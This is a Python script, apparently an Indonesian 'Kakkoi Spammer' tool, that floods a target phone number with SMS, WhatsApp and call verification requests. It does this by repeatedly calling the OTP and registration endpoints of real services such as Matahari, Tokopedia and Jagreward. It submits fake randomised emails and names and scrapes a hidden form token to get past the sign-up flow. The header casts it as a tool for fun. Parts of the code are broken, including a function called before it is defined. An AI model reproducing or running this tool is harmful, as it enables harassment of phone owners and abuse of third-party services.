#	 Tools : Kakkoi Namae II ( Spam Sms, Call, Wa)
#	 Author : Kakkoi Namae II ( Three Master )
#	 github : https://github.com/Kakkoinamae
#	 Note :  Jangan Di gunakan Untuk Menjahili Orang Tua
#	 Gunakan Lah Untuk Bersenang Senang !!!
#	 Import, From
		# Jangan di ubah
try:
        import time,sys,os,json,requests,random,re,get
        from requests import post
except ModuleNotFoundError:
         print ()
         print ('[!] Install Module Requests')
         print ()
         os.system('pip install requests')

try:    # Janggan di ubah
        ip = requests.get('https://api.ipify.org').text
except requests.exceptions.ConnectionError:
        print ()
        exit(' [!] Koneksi Internet Error')
			# git pull untuk melakukan update otomatis
print ()
os.system("git pull")
req = requests.Session()
kakkoi_point = 1
				# Jangan di ubah
Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
				# Jangan di ubah
Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])
# -------{ ini adalah inti dari script nya }-------- #
def mr_dark_nutric():
  darkreq = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(darkreq.text)["StatusMessage"] == 'Request misscall berhasil':
       sukses("1","call","nutriclub")
       time.sleep(30)
  else:
       gagal("1","call","nutriclub")
       time.sleep(30)
def mr_dark_jag():
  dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
  dark_json = json.loads(dark_request.text)
  if dark_json["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
       sukses("2","call","jagreward")
       time.sleep(30)
  else:
       print (f'   \033[1;37m[\033[31m\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
       time.sleep(30)
# Menu Pertama
def bersih():
	os.system("clear")
# Keluar
def keluar():
	print ()
	print ("TERIMA KASIH SUDAH MEMAKAI PROGRAM SAYA")
	print ("BY² \033[1;91mATTACKER \033[1;97m:(")
	time.sleep(1)
	os.sys.exit()
# Mencari Tahu Nama Pengguna
def siapa():
	time.sleep(3)
	print ()
	siapa = input("\033[1;93mWhats Your Name ? \033[1;91m> \033[1;97m")
	if siapa =="":
		print ()
		time.sleep(1)
		exit("[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
	else:
		print ()
		time.sleep(1)
		print ("\033[1;93mWelcome\033[1;97m",siapa,"\033[1;93mTo Program \033[1;91mKakkoi Spammer \033[1;97mツ")
		time.sleep(3)
siapa()
# Menu Kedua
def sandi():
	bersih()
	time.sleep(1)
	print ("______________________________________________________________________________")
	print ("|                                                                              |")
	print ("|                         \033[1;96mKAKKOI SPAMMER \033[1;93mVERSION 1.2                           \033[1;97m|")
	print ("|______________________________________________________________________________|")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                \033[1;91mUser Name:           \033[1;97m[   \033[1;94mMuhammad    ]                        \033[1;97m|")
	print ("|                                                                              |")
	print ("|                 \033[1;91mPassword:           \033[1;97m[   \033[1;94mRistawakal N ]                       \033[1;97m|")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                   \033[1;97m[ \033[1;91mOK \033[1;97m]                                     |")
	print ("|______________________________________________________________________________|")
	print ("|                                                                              |")
	print ("|                                               https://github.com/Kakkoinamae |")
	print ("|______________________________________________________________________________|")
	print ()
	print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0\033[1;97m                ]")
	print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
	print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
	print ("+ -- --=[ BRUTEFORCE                                      ]")
	print ()
	print ("			Masukkan \033[1;91mUser name \033[1;97mDan \033[1;91mPassword !!!")
	print ()
	contoh = input("			\033[1;91m[\xf0\x9f\x94\x90] \033[1;91mUSER NAME :\033[1;92m ")
	if contoh == "Muhammad":
		time.sleep(1)
		print ("			\033[1;94m[\xe2\x9c\x93] \033[1;94mUSERNAME:\033[1;92m " + contoh + "\033[1;92m(✓)")
		time.sleep(2)
		print ()
	else:
		time.sleep(1)
		print ("			\033[1;91m[\xf0\x9f\x94\x90] \033[1;91mUSERNAME : SALAH (X)")
		time.sleep(1)
		print ("			\033[1;91mSILAHKAN COBA LAGI !")
		time.sleep(2)
		sandi()
	contoh2 = input("			\033[1;91m[\xf0\x9f\x94\x90] \033[1;91mPASSWORD :\033[1;92m ")
	if contoh2 == "Ristawakal N":
		time.sleep(1)
		print ("			\033[1;94m[\xe2\x9c\x93] \033[1;94mPASSWORD:\033[1;92m " + contoh2 + "\033[1;92m(✓)")
		time.sleep(2)
	else:
		time.sleep(1)
		print ("			\033[1;91m[\xf0\x9f\x94\x90] \033[1;91mPASSWORD : SALAH (X)")
		time.sleep(1)
		print ("			\033[1;91mSILAHKAN COBA LAGI ! HAMPIR DEKAT...")
		time.sleep(2)
		sandi()
# Sandi
sandi()
# Banner Nya Cuuk
banner1 ="""
                     .ed$$$" ""$$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       .""$"*$$$$$$$$bc
                    .-"    .$***$$$""$"*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*$"$"    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*     Love Spammer             *  J$$$e*
            $$$$                            "$$$" """

# Menu Ketiga
def logo():
	bersih()
	time.sleep(2)
	print ("\033[1;91m                .;lxO0KXXXK0Oxl:. ")
	print ("\033[1;91m            ,o0WMMMMMMMMMMMMMMMMMMKd, ")
	print ("\033[1;91m         'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx, ")
	print ("\033[1;91m       :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK: ")
	print ("\033[1;91m     .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX, ")
	print ("\033[1;91m    lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo ")
	print ("\033[1;91m   xMMMMMMMMMMWd.               .oNMMMMMMMMMMk ")
	print ("\033[1;91m  oMMMMMMMMMMx.                    dMMMMMMMMMMx ")
	print ("\033[1;91m  WMMMMMMMMM:                       :MMMMMMMMMM, ")
	print ("\033[1;91m xMMMMMMMMMo                         lMMMMMMMMMO ")
	print ("\033[1;91m NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc; ")
	print ("\033[1;91m MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX: ")
	print ("\033[1;91m NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX: ")
	print ("\033[1;91m xMMMMMMMMMd                        ,0MMMMMMMMMMK; ")
	print ("\033[1;91m .WMMMMMMMMMc                         'OMMMMMM0, ")
	print ("\033[1;91m  lMMMMMMMMMMk.                         .kMMO' ")
	print ("\033[1;91m   dMMMMMMMMMMWd'                         .. ")
	print ("\033[1;91m    cWMMMMMMMMMMMNxc'.               \033[1;97m########## ")
	print ("\033[1;91m     .0MMMMMMMMMMMMMMMMWc           \033[1;97m#+#    #+# ")
	print ("\033[1;91m       ;0MMMMMMMMMMMMMMMo.         \033[1;97m+""\033[1;91m:""\033[1;97m+ ")
	print ("\033[1;91m         .dNMMMMMMMMMMMMo         \033[1;97m+#++""\033[1;91m:""\033[1;97m++#+ ")
	print ("\033[1;91m            'oOWMMMMMMMMo                \033[1;97m+""\033[1;91m:""\033[1;97m+ ")
	print ("\033[1;91m                .,cdkO0K;        \033[1;91m:""\033[1;97m+""\033[1;91m:    :""\033[1;97m+""\033[1;91m: ")
	print ("\033[1;91m                                 \033[1;91m:::::::""\033[1;97m+""\033[1;91m:")
	print ()
	print ("\033[1;93m                      𝙆𝙖𝙠𝙠𝙤𝙞 𝙎𝙥𝙖𝙢𝙢𝙚𝙧 ")
	print ()
	print ("\033[1;97m				https://github.com/KakkoiNamae ")
	print ()
	time.sleep(1)
	print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0                \033[1;97m]")
	time.sleep(1)
	print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
	time.sleep(1)
	print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
	time.sleep(1)
	print ("+ -- --=[ BRUTEFORCE                                      ]")
	print ("")
	time.sleep(1)
	print ("Kakkoi Spammer tip: Kakkoi Spammer	\033[1;93m•  \033[1;94mStatus     \033[1;97m: \033[1;92mOnline")
	print ("\033[1;97mcan be configured at startup, see	\033[1;93m•  \033[1;94mID Script  \033[1;97m: \033[1;92m3132")
	print ("\033[1;91mSpammer \033[1;97mhelp to learn more		\033[1;93m•  \033[1;94mMode       \033[1;97m: \033[1;92mFree")
	print ("")
# Logo ()
logo()
# Menu Keempat
def menu():
	contoh3 = input("\033[1;97mKS_\033[1;93mV2.1 \033[1;91m> \033[1;97m")
	if contoh3 == "help":
		print ("")
		print (" Core Commands")
		print ("==============")
		print ()
		print ()
		print ("		 Command		Description ")
		print ("		============		===================")
		print ("		banner		:	Display an awesome Kakkoi Spammer banner")
		print ("		help		:	To help menu")
		print ("		contact		:	Contact me ?")
		print ("		spam		:	To start spammer")
		print ("		quit		:	Exit to program")
		print ("		version		:	Check in version program")
		print ("		info		:	Information the program")
		print ("		date		:	you are date ? ")
		print ("		clear		:	Did you mean to clear program ?")
		print ("		login		:	How to login spammer ?")
		print ()
		time.sleep(1)
		print ("				\033[1;91mツ \033[1;97mComing Soon...")
		print ()
		menu()
	elif contoh3 == "quit":
		keluar()
	elif contoh3 == "date":
		print()
		os.system ("date | lolcat")
		print()
		menu()
	elif contoh3 == "version":
		print ("Kakkoi Spammer ")
		print ("Version \033[1;93m1.2.0-dev-c3132v0 ")
		menu()
	elif contoh3 == "clear":
		bersih()
		menu()
	elif contoh3 == "info":
		print ()
		print ("\033[1;91m		Kakkoi Spammer V.\033[1;93mv1.2.0-dev-c3132v0")
		print ("\033[1;91m		Author \033[1;97m: \033[1;93mKakkoi Namae II")
		print ("\033[1;91m		Github \033[1;97m: \033[1;93mhttps://github.com/Kakkoinamae")
		print ("\033[1;91m		Team   \033[1;97m: \033[1;93mMavia Teknologi")
		print ("\033[1;91m		Status \033[1;97m: \033[1;93mBruteforce")
		print ("\033[1;91m		Tools \033[1;97m : \033[1;93mSpammer")
		menu()
	elif contoh3 == "contact":
		print ()
		print ("	\033[1;93m	PILIH NOMOR BERAPA ? ")
		print ()
		print (" 	\033[1;94m1\033[1;97m.\033[1;91m>> \033[1;97mFacebook		\033[1;94m6\033[1;97m.\033[1;91m>> \033[1;97mDiscord")
		print (" 	\033[1;94m2\033[1;97m.\033[1;91m>> \033[1;97mWhatsapp		\033[1;94m7\033[1;97m.\033[1;91m>> \033[1;97mTik Tok")
		print (" 	\033[1;94m3\033[1;97m.\033[1;91m>> \033[1;97mInstagram		\033[1;94m8\033[1;97m.\033[1;91m>> \033[1;97mPinterest")
		print (" 	\033[1;94m4\033[1;97m.\033[1;91m>> \033[1;97mTelegram		\033[1;94m9\033[1;97m.\033[1;91m>> \033[1;97mXbox")
		print (" 	\033[1;94m5\033[1;97m.\033[1;91m>> \033[1;97mMessenger		\033[1;94m10\033[1;97m.\033[1;91m>> \033[1;97mYoutube")
		print ()
		time.sleep(1)
		pilih = input("\033[1;97mContact \033[1;91m> \033[1;97m")
		if pilih == "1":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			os.system ("xdg-open https://www.facebook.com/Shirangryu")
			time.sleep(3)
			print ()
			menu()
		if pilih == "2":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			os.system ("xdg-open https://api.whatsapp.com/send?phone=6285823104620&text=Assalamualaikum%20bg.%20salam%20kenal%20yaa")
			time.sleep(3)
			print ()
			menu()
		if pilih == "3":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait...")
			time.sleep(2)
			os.system ("xdg-open https://www.instagram.com/invites/contact/?i=vrmj1wqfx8qz&utm_content=ljkhdz3")
			time.sleep(3)
			print ()
			menu()
		if pilih == "4":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait...")
			time.sleep(2)
			os.system ("xdg-open https://t.me/KakkoiNamae")
			time.sleep(3)
			print ()
			menu()
		if pilih == "5":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			os.system ("xdg-open https://free.facebook.com/photo.php?fbid=232692795670279&id=100067886811771&set=a.127281592878067&refid=17")
			time.sleep(3)
			print ()
			menu()
		if pilih == "6":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] \033[1;97mComing Soon... ")
			time.sleep(3)
			print ()
			menu()
		if pilih == "7":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] \033[1;97mComing Soon... ")
			time.sleep(3)
			print ()
			menu()
		if pilih == "8":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] \033[1;97mComing Soon... ")
			time.sleep(3)
			print ()
			menu()
		if pilih == "9":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] \033[1;97mComing Soon... ")
			time.sleep(3)
			print ()
			menu()
		if pilih == "10":
			print ()
			time.sleep(1)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ("\033[1;97m[\033[1;91m!\033[1;97m] \033[1;97mComing Soon... ")
			time.sleep(3)
			print ()
			menu()
		else:
			print ("[\033[1;91m!\033[1;97m] Command\033[1;91m", pilih, "\033[1;97mNot Found")
			time.sleep(1)
			menu()
			spam()
	elif contoh3 == "banner":
		time.sleep(1)
		print (banner1)
		print ()
		menu()
	elif contoh3 == "banner" == "banner2":
		time.sleep(1)
		print (banner2)
		print ()
		menu()
	elif contoh3 == "login":
		sandi()
		logo()
		menu()
	elif contoh3 == "spam":
		time.sleep(2)
		bersih()
		print ("                   -'           ^''**$$$e.")
		print ("                 .*                   '$$$c")
		print ("                /                      '4$$b")
		print ("               d  3                      $$$$")
		print ("               $  *                   .$$$$$$")
		print ("              .$  ^c           $$$$$e$$$$$$$$.")
		print ("              d$L  4.         4$$$$$$$$$$$$$$b")
		print ("              $$$$b \033[1;91m^ceeeee.  \033[1;97m4$\033[1;91m$ECL.F\033[1;97m*$$$$$$$")
		print ("  e$''=.      $$$$P \033[1;91md$$$$F $ \033[1;97m$$\033[1;91m$$$$$$$- \033[1;97m$$$$$$")
		print (" z$$b. ^c     3$$$F \033[1;91m'$$$$b   \033[1;97m$'\033[1;91m$$$$$$$  \033[1;97m$$$$*'      .=''$c")
		print ("4$$$$L        $$P'  \033[1;91m'$$b   .\033[1;97m$ $\033[1;91m$$$$...  \033[1;97me$$        .=  e$$$.")
		print ("^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$")
		print ("  '**$$$ec   '   %ce""    $$$  $$$$$$$$$$*    .r' =$$$$P''")
		print ("        '*$b.  'c  *$e.    *** d$$$$$'L$$    .d'  e$$***'")
		print ("          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*'.eeP'")
		print ("             '$$$$$$''$=e....$*$$**$cz$$' '..d$*'")
		print ("               '*$$$  *=%4.$ L L$ P3$$$F $$$P'")
		print ("                  '$   '%*ebJLzb$e$$$$$b $P'")
		print ("                    %..      4$$$$$$$$$$ '")
		print ("                     $$$e   z$$$$$$$$$$%")
		print ("                      '*$c  '$$$$$$$P'")
		print ("                       .''$'*$$$$$$$$bc")
		print ("                    .-'    .$***$$$''$'*e.")
		print ("                 .-'    .e$'     '*$c  ^*b.")
		print ("          .=*$'$'    .e$*'          '*bc  '*$e..")
		print ("        .$'        .z*'               ^*$e.   '*****e.")
		print ("        $$ee$c   .d'                     '*$.        3.")
		print ("        ^*$E')$..$'                         *   .ee==d%")
		print ("           $.d$$$*     \033[1;91mlove spammer             \033[1;97m*  J$$$e*")
		print ("            $$$$                             '$$$'")
		print ()
		print ("                                https://github.com/KakkoiNamae")
		print ()
		time.sleep(1)
		print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0	          \033[1;97m]")
		time.sleep(1)
		print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
		time.sleep(1)
		print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
		time.sleep(1)
		print ("+ -- --=[ BRUTEFORCE                                      ]")
	else:
		print ("[\033[1;91m!\033[1;97m] Command\033[1;91m", contoh3, "\033[1;97mNot Found")
		time.sleep(1)
		menu()
# Menu ()
menu()
# Spammer Hououo....
def spam():
	print ()
	print (" Ketik \033[1;93m'exit' \033[1;97mUntuk Keluar Dari Program !")
	print ()
	print ("			 Pilih Jenis \033[1;91mSpam \033[1;91m:")
	print ()
	time.sleep(1)
	print ("	\033[1;93m1\033[1;97m). \033[1;91m> 	\033[1;97mSpam Sms		( \033[1;92mMatahari \033[1;97m) \033[1;93mBy \033[1;91mXenzi Ganz")
	print ("	\033[1;93m2\033[1;97m). \033[1;91m>	\033[1;97mSpam Wa			( \033[1;92mTokopedia \033[1;97m) \033[1;93mBy \033[1;91mMR. Dark")
	print ("	\033[1;93m3\033[1;97m). \033[1;91m>	\033[1;97mSpam Call		( \033[1;92mJagreward \033[1;97m) \033[1;93mBy \033[1;91mMR. Dark")
	print ("	\033[1;93m4\033[1;97m). \033[1;91m>	\033[1;97mSpam Brutal		( \033[1;92mSms, Call, Wa \033[1;97m) \033[1;91mCooming Soon...")
	print ("	\033[1;93m5\033[1;97m). \033[1;91m> 	\033[1;97mQuit")
	print ()
	time.sleep(1)
	pilih2 = input("Number \033[1;91m> \033[1;97m")
	if pilih2 == "1":
		time.sleep(1)
		print ("Kakkoi Spammer tip: Kakkoi Spammer")
		print ("can be configured at startup, see")
		print ("your the number target contoh : 0858xxx")
		print ("")
		kakkoi_point = 1
		nomor = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
		if nomor == "":
			exit("[\033[1;91m!\033[1;97m] Gak Boleh Kosong")
		elif len(nomor) <= 9:
			exit("[\033[1;91m!\033[1;97m] Nomor Tidak Valid")
		else:
			jml = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		heder = {'Host': 'www.matahari.com',
				'content-length': '240',
				'origin': 'https://www.matahari.com',
				'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
				'content-type': 'application/json',
				'accept': '*/*',
				'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
				'save-data': 'on',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.matahari.com/customer/account/create/',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
		data = {
			"thor_customer": {
				"name": Name,
				"email_address": Email,
				"mobile_country_code": "+62",
				"gender_id": "1",
				"mobile_number": nomor,
				"mro": "",
				"password": "Wadepak1037",
				"birth_date": "04/02/2022"
				}
			}

		print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
		for i in range(jml):
			sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
			if 'Success' in sec.text:
				print(f'\033[37m[\033[35m{kakkoi_point}\033[37m] \033[33mMessage \033[31m: \033[32mSpam Sms Succes Terkirim')
				time.sleep(3)
				kakkoi_point += 1
			else:
				print(f'\033[37m[\033[35m{kakkoi_point}\033[37m] \033[33mMessage \033[31m: \033[31mSpam Sms Gagal Terkirim')
				time.sleep(3)
				kakkoi_point += 1
			time.sleep(1.5)
		print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai... \033[33m:)')
		print ()
		spam()
	elif pilih2 == "2":
		print ()
		time.sleep(1)
		print ("Kakkoi Spammer tip: Kakkoi Spammer")
		print ("can be configured at startup, see")
		print ("your the number target contoh : 0858xxx")
		print ("")
		kakkoi_point = 1
		xl_0 = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
		no = ("0"+xl_0)
		jumlah = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		InquiryId_xl = "237992422"
		id_xl = "237775262"
		dark_user = {
		'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
		'Accept-Encoding' : 'gzip, deflate',
		'Connection' : 'keep-alive',
		'Origin' : 'https://accounts.tokopedia.com',
		'Accept' : 'application/json, text/javascript, */*; q=0.01',
		'X-Requested-With' : 'XMLHttpRequest',
		'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = dark_user).text
		drk = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		mr_dark_to_the_moon = {
		"otp_type" : "116",
		"msisdn" : no,
		"tk" : drk,
		"email" : '',
		"original_param" : "",
		"user_id" : "",
		"signature" : "",
		"number_otp_digit" : "6"
		}
		mr_dark_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
		for i in range(int(jumlah)):
			if 'Sorry Bro, Anda sudah melakukan 3 kali pengiriman kode' in mr_dark_bruh:
				print(f'\033[1;37m[\033[31m{kakkoi_point}\033[1;37m] \033[1;37mSilahkan Coba Ulang Setelah 5 menit! \033[31m ')
				time.sleep(5)
				kakkoi_point += 1
			else:
				print(f'\033[1;37m[\033[1;32m{kakkoi_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
				time.sleep(5)
				kakkoi_point += 1
		print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai... \033[33m:)')
		print ()
		spam()
	elif pilih2 == "3":
		print ()
		time.sleep(1)
		print ("Kakkoi Spammer tip: Kakkoi Spammer")
		print ("can be configured at startup, see")
		print ("your the number target contoh : 0858xxx")
		print ("")
		kakkoi_point = 1
		call = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
		no = ("0"+call)
		jumla = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		hd = {
		"accept": "text/html, application/xhtml+xml, application/json, */*",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-length": "166",
		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"origin": "https://h5.rupiahcepatweb.com",
		"referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/80.0.3987.132 Safari/537.36"
		}
		dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
		data = json.dumps(dt)
		print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
		for i in range(int(jumla)):
			dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+call)
			dark_json = json.loads(dark_request.text)
			if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
				print (f"\033[1;37m[\033[1;32m{kakkoi_point}\033[1;37m] \033[1;32mTerkirim \033[31m")
				time.sleep(30)
				kakkoi_point += 1
			else:
				print (f'\033[1;37m[\033[31m{kakkoi_point}\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
				time.sleep(30)
				kakkoi_point += 1
		print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai... \033[33m:)')
		print ()
		spam()
	elif pilih2 == "4":
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
		time.sleep(2)
		print ("Coming Soon \033[1;91m!")
		time.sleep(3)
		print ()
		spam()
	elif pilih2 == "5":
		print ()
		print ("[!] Exit")
		time.sleep(1)
		logo()
		menu()
		spam()
	elif pilih2 == "exit":
		keluar()
	else:
		print ("[\033[1;91m!\033[1;97m] Command\033[1;91m", pilih2, "\033[1;97mNot Found")
		time.sleep(1)
		spam()
spam()
#selesai

